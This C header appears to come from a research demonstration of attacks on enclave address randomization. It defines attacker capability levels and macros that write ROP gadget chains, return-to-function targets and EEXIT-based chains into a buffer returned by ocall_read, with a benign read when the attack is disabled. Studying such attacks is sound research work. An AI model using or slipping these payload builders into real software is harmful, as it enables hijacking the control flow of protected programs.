#ifndef __ATTACK_DEMO
#define __ATTACK_DEMO

/* conduct attack? */
#ifdef TECH
#define DO_ATTACK 1
#endif

//----------------------------------------------

/* power of attacker */

                        /* What it knows: */
#define KERNEL      0   /* base addr + page fault */
#define HOST_PROG   1   /* base addr */
#define REMOTE      2   /* range of base addr */
#define MEM_LEAK    3   /* addresses of memory objects */

//----------------------------------------------

/* technique for attack */

                            /* How many bits to guess: */
#define RET_TO_FUNC     0   /* 7 bits */
#define ROP             1   /* 4 * 7 bits */
#define ROP_EEXIT       2   /* 3 * 7 bits */
#define CODE_INJECTION  3   /* 0 bits */

//----------------------------------------------

/* randomly load? */
#ifndef RAND
#ifdef DO_ATTACK

#if (ATTACKER == MEM_LEAK)
#define RAND 0
#else
#define RAND 1
#endif

#endif /* DO_ATTACK */
#endif /* RAND */

//----------------------------------------------

/* build payload */
#ifdef DO_ATTACK

#ifndef TECH
#define TECH RET_TO_FUNC
#endif  /* ifndef TECH */

/* set payload -- used by ocall_read() */
#define SET_PL(idx, pl) ((unsigned long *)buf)[idx] = (unsigned long)(pl)


/* MEM_LEAK */
#if (TECH == ROP) && (ATTACKER == MEM_LEAK)
#define BUILD_PAYLOAD()             \
    SET_PL(0, gg[2]);               \
    SET_PL(1, gg[3]);               \
    SET_PL(2, gg[4]);               \
    SET_PL(3, gg[5])
#elif (TECH == ROP_EEXIT) && (ATTACKER == MEM_LEAK)
#define BUILD_PAYLOAD()             \
    SET_PL(0, gg[6]);               \
    SET_PL(1, 0xFFFFFFFFFFFFFFFF);  \
    SET_PL(2, gg[7]);               \
    SET_PL(3, &attack_msg);          \
    SET_PL(4, attacked);            \
    SET_PL(5, gg[8])
#elif (TECH == RET_TO_FUNC) && (ATTACKER == MEM_LEAK)
#define BUILD_PAYLOAD()             \
    SET_PL(0, gg[2]);
#endif


/* KERNEL */
#if (TECH == ROP) && (ATTACKER == KERNEL)
#define BUILD_PAYLOAD()                 \
    SET_PL(0, guess_in_page(gg[2]));    \
    SET_PL(1, guess_in_page(gg[3]));    \
    SET_PL(2, guess_in_page(gg[4]));    \
    SET_PL(3, guess_in_page(gg[5]))
#elif (TECH == ROP_EEXIT) && (ATTACKER == KERNEL)
#define BUILD_PAYLOAD()                 \
    SET_PL(0, guess_in_page(gg[6]));    \
    SET_PL(1, 0xFFFFFFFFFFFFFFFF);      \
    SET_PL(2, guess_in_page(gg[7]));    \
    SET_PL(3, &attack_msg);              \
    SET_PL(4, attacked);                \
    SET_PL(5, guess_in_page(gg[8]))
#elif (TECH == RET_TO_FUNC) && (ATTACKER == KERNEL)
#define BUILD_PAYLOAD()                 \
    SET_PL(0, guess_in_page(gg[2]));
#endif


/* HOST_PROG */
#if (TECH == ROP) && (ATTACKER == HOST_PROG)
#define BUILD_PAYLOAD()                 \
    SET_PL(0, guess_in_space(gg[2]));   \
    SET_PL(1, guess_in_space(gg[3]));   \
    SET_PL(2, guess_in_space(gg[4]));   \
    SET_PL(3, guess_in_space(gg[5]))
#elif (TECH == ROP_EEXIT) && (ATTACKER == HOST_PROG)
#define BUILD_PAYLOAD()                 \
    SET_PL(0, guess_in_space(gg[6]));   \
    SET_PL(1, 0xFFFFFFFFFFFFFFFF);      \
    SET_PL(2, guess_in_space(gg[7]));   \
    SET_PL(3, &attack_msg);              \
    SET_PL(4, attacked);                \
    SET_PL(5, guess_in_space(gg[8]))
#elif (TECH == RET_TO_FUNC) && (ATTACKER == HOST_PROG)
#define BUILD_PAYLOAD()                 \
    SET_PL(0, guess_in_space(gg[2]));
#endif


/* REMOTE */
#if (TECH == ROP) && (ATTACKER == REMOTE)
#define BUILD_PAYLOAD()                 \
    SET_PL(0, guess_base(gg[2]));       \
    SET_PL(1, guess_base(gg[3]));       \
    SET_PL(2, guess_base(gg[4]));       \
    SET_PL(3, guess_base(gg[5]))
#elif (TECH == ROP_EEXIT) && (ATTACKER == REMOTE)
#define BUILD_PAYLOAD()                 \
    SET_PL(0, guess_base(gg[6]));       \
    SET_PL(1, 0xFFFFFFFFFFFFFFFF);      \
    SET_PL(2, guess_base(gg[7]));       \
    SET_PL(3, &attack_msg);              \
    SET_PL(4, attacked);                \
    SET_PL(5, guess_base(gg[8]))
#elif (TECH == RET_TO_FUNC) && (ATTACKER == REMOTE)
#define BUILD_PAYLOAD()                 \
    SET_PL(0, guess_base(gg[2]));
#endif

#else   /* ifdef DO_ATTACK */

#define BUILD_PAYLOAD() \
    *ret = read(fd, buf, count);

#endif  /* ifdef DO_ATTACK */

//----------------------------------------------

#endif
